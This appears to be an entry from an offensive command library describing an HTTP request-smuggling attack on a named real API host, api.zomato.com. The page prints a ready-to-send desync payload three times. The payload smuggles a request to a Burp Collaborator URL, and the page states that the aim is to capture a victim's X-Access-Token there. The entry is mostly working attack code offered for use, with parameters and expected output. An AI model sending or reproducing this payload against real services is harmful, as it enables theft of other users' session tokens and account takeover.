---
data: >-
  DELETE / HTTP/1.1

  Transfer-Encoding: chunked

  Host: api.zomato.com

  Content-Length: 91

  User-Agent: Treasure/6.7

  0


  GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/
  HTTP/1.1

  X: X
tags:
  - http-smuggling
  - open-redirect
type: command
executor: http
platforms:
  - Web
id: 0b36293f-e6e7-49c2-904b-4f272b575984
created_at: '2025-12-13T09:01:26.140Z'
updated_at: '2025-12-13T09:01:26.140Z'
verified: false
validated: true
submitted: true
---
# HTTP Smuggling with Redirect

## Command

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

## Description

Smuggles a request to force an open redirect and steal victim's X-Access-Token via Collaborator.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Targets api.zomato.com | Yes |
| `Content-Length` | Sets request size to 91 | Yes |
| `Transfer-Encoding` | Chunked with tab for desync | Yes |
| `GET https://...` | Triggers redirect to attacker URL | Yes |

## Examples

### Basic Usage

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

## Expected Output

Victim's request with X-Access-Token in Burp Collaborator.

## Related

- [[procedures/Chain-Smuggling-with-Open-Redirect-to-Steal-Tokens]]
